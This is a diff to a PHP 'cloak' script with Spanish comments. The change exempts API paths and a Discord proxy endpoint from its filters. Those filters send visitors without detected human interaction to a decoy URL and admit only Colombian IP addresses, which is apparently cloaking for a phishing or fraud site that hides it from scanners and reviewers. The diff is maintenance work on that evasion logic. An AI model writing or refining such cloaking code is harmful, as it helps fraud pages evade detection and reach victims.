@@ -43,14 +43,13 @@ if (session_status() === PHP_SESSION_NONE) {
 // BYPASS MAESTRO — Rutas internas u operaciones
 // ══════════════════════════════════════════════
 $_uri = $_SERVER['REQUEST_URI'] ?? '';
+
+// ✅ AGREGA ESTO AQUÍ
+$isApiRequest = strpos($_uri, '/api/') === 0 || strpos($_uri, 'proxy_discord.php') !== false;
+
 $_bypassPaths = [
     'proxy_discord.php'
 ];
-foreach ($_bypassPaths as $_bp) {
-    if (strpos($_uri, $_bp) !== false) {
-        return; // ← Salir de cloak SIN aplicar NINGÚN filtro
-    }
-}
 
 // ── BLINDAJE ULTRA: Validación de Flujo ──
 $targetPath = basename($_SERVER['SCRIPT_NAME']);
@@ -69,7 +68,7 @@ if ($isAdmin) {
 
 $isPublicEntry = in_array($targetPath, ['index.php', 'decoy.php', 'proxy_discord.php']);
 
-if (!$isPublicEntry) {
+if (!$isPublicEntry && !$isApiRequest) {
     // 1. Validar si se detectó comportamiento humano previo
     if (cloak_get_cookie('is_human') !== 'true' && !isset($_SESSION['is_human'])) {
         cloak_send_to_decoy('no_human_interaction', $DECOY_URL);
@@ -207,7 +206,7 @@ $clientIP = cloak_get_ip();
 $userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
 
 // --- Excepción para Webhooks y Endpoints Internos ---
-$isInternalApi = (strpos($targetPath, 'proxy_discord.php') !== false);
+$isInternalApi = $isApiRequest;
 
 if (!$isInternalApi) {
     // ── 6b. Blindaje Extremo: Geo-IP (Solo Colombia 🇨🇴) ──
